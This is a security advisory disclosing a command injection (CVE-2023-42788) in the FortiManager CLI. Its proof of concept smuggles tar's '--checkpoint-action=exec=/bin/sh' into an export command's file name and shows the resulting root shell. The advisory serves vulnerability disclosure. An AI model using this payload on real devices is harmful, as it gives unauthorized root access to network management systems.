# Fortinet FortiManager - Command Injection (CVE-2023-42788)

Moderate

[orange-cert-cc](/orange-cert-cc)
published
GHSA-qpv8-g6qv-rf8p
Oct 11, 2023

## Package

FortiManager
(Fortinet)

## Affected versions

7.2.2

## Patched versions

7.2.4

## Description

### Overview

On FortiManager, some CLI commands are vulnerable to command injection.

As the software does not implement countermeasures, this allows an attacker to spawn an interactive shell on the device. The vulnerable commands are only allowed to a privileged user (privilege "System Settings").

This vulnerability had already been reported in 2021 [CVE-2021-26104] ([GHSA-f73m-fvj3-m2pm](https://github.com/orangecertcc/security-research/security/advisories/GHSA-f73m-fvj3-m2pm "GHSA-f73m-fvj3-m2pm")), however the fix was incomplete.

### Details

Administrators can gain access to a root shell on the vulnerable FortiManager.

On the CLI, some `diagnose` commands allow an administrator to export files (especially `umlog` and `fmwslog`) to an external FTP/SFTP. The administrator provides hostname, user, password and target file name for the transfer. These parameters are not properly sanitized, and a command injection is possible when these commands are executed with specially crafted parameters.

After the 2021 report, some sanitization have been added in a attempt to block the command injection. However, the injection is still possible through the parameters passed to the underlying `tar` command. For instance, the parameters `--checkpoint` and `--checkpoint-action` can be abused in order to get a root shell.

Futhermore, there is no countermeasures implemented. All the processes are running with root privileges, even the scripts and binaries handling the inputs of a user. As a result, it is trivial to get an interactive shell on the device through this vulnerability.

### Proof of Concept

When connected to the CLI as a user with "System Settings", using a

FTP transfer of `umlog`:

```
# diagnose system export umlog ftp misc 127.0.0.1 user password directory "test.tgz' -v --ignore-case --checkpoint=1 --checkpoint-action=exec=/bin/sh #"
Packing up the log files to /var/config/test.tgz' -v --ignore-case --checkpoint=1 --checkpoint-action=exec=/bin/sh #
Copying files to temp folder...
Generating file /var/config/test.tgz' -v --ignore-case --checkpoint=1 --checkpoint-action=exec=/bin/sh #...
tar: #': Cannot stat: No such file or directory
drwxr-xr-x root/root         0 2023-05-16 16:27 umlog/
-rw-r--r-- root/root       331 2023-05-16 16:27 umlog/misc.log
sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
sh-5.0# uname -a
Linux OGSB-FMG-Service 4.14.244 #1 SMP Wed Feb 1 20:55:31 PST 2023 x86_64 GNU/Linux
sh-5.0#

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
